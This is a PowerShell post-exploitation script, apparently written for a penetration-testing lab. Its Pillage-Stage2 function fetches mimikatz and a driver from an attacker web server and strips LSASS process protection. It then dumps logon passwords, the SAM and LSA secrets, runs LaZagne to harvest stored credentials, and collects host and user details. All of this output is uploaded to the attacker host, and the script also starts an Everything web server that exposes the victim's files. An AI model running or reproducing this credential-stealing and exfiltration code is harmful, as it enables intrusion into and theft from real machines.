Function Upload($Uri, $FilePath){
    $Boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $BodyLines = (
        "--$Boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($FilePath))`"",
        "Content-Type: application/octet-stream",
        "",
        [System.IO.File]::ReadAllText($FilePath),
        "--$Boundary--"
    ) -join $LF

    $Headers = @{
        "Content-Type" = "multipart/form-data; boundary=$Boundary"
    }

    Invoke-RestMethod -Uri $Uri -Method Post -Headers $Headers -Body $BodyLines
}

Function PostJson($Uri, $Data){
    $Headers = @{
        "Content-Type" = "application/json"
    }
    Invoke-RestMethod -Uri $Uri -Method Post -Headers $Headers -Body $Data
}

Function Pillage-Stage2($webBase){
    # expectes "http://192.168.45.154:7999/" as param

    # Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
    # reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
    # mimikatz # !+
    # mimikatz # !processprotect /process:lsass.exe /remove
    # folder?
    # "!+" "!processprotect /process:lsass.exe /remove"

    $protected = ""
    $cleanup = ""
    $ppl = (Get-ItemProperty HKLM:\System\CurrentcontrolSet\Control\Lsa -Name RunAsPPL -Erroraction Ignore).RunAsPPL
    if ($ppl -eq 1){
        $protected = "!+`" `"!processprotect /process:lsass.exe /remove"
        $cleanup = "!-"
    }
    


    Invoke-WebRequest -Uri $webBase"dist/mimikatz.exe" -OutFile C:\Folder1\mimikatz.exe
    Invoke-WebRequest -Uri $webBase"dist/mimidrv.sys" -OutFile C:\Folder1\mimidrv.sys
    # C:\Windows\System32\curl.exe -o C:\Folder1\mimikatz.exe $webBase"dist/mimikatz.exe"
    # C:\Windows\System32\curl.exe -o C:\Folder1\mimidrv.sys  $webBase"dist/mimidrv.sys"

    # else mimikatz can't find the driver
    Push-Location c:\Folder1

    C:\Folder1\mimikatz.exe "log C:\Folder1\mimikatz.log" $protected "privilege::debug" "token::elevate" "sekurlsa::logonPasswords full" $cleanup "exit"
    C:\Folder1\mimikatz.exe "log C:\Folder1\mimikatz.log" $protected "privilege::debug" "token::elevate" "lsadump::sam" $cleanup "exit"
    C:\Folder1\mimikatz.exe "log C:\Folder1\mimikatz.log" $protected "privilege::debug" "token::elevate" "lsadump::secrets" $cleanup "exit"

    # we have to go back, kate
    Pop-Location

    $FilePath = "C:\Folder1\mimikatz.log"
    $Uri = $webBase + "upload/mimikatz/$env:COMPUTERNAME"

    Upload $Uri $FilePath


    # Local System Infos
    $LocalIps = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -Property IPAddress )

    $knownUsers = @("DefaultAccount", "Guest", "WDAGUtilityAccount")
    $localUsers = (Get-LocalUser | Where-Object { $knownUsers -notcontains  $_.Name } | select-object -Property Name )

    # userprofiles
    $userProfiles = (dir C:\Users | select-object -Property Name )

    $obj = New-Object PSObject (@{
        "local_ips" = $LocalIps
        "local_users" = $localUsers
        "user_profiles" = $userProfiles
    })

    

    $Uri = $webBase + "upload/sysinfo/win/$env:COMPUTERNAME"
    PostJson $Uri ($obj | ConvertTo-Json)

    Write-Host "[!] Everything Setup"
    Write-Host "[*] Go to http://victim:7998"
    # Everything + Web Server
    Invoke-WebRequest -Uri $webBase"dist/everything.exe" -OutFile C:\Folder1\everything.exe
    Invoke-WebRequest -Uri $webBase"dist/Everything.ini" -OutFile C:\Folder1\Everything.ini
    Start-Process -NoNewWindow C:\Folder1\everything.exe -ArgumentList "-config C:\Folder1\Everything.ini"


    Write-Host "[!] Lazagne"
    Invoke-WebRequest -Uri $webBase"dist/LaZagne.exe" -OutFile C:\Folder1\LaZagne.exe
    Start-Process C:\Folder1\LaZagne.exe -ArgumentList "all" -RedirectStandardOutput "C:\Folder1\lazagne.log" -NoNewWindow -Wait
    
    $FilePath = "C:\Folder1\lazagne.log"
    $Uri = $webBase + "upload/generic/$env:COMPUTERNAME"

    Upload $Uri $FilePath

}

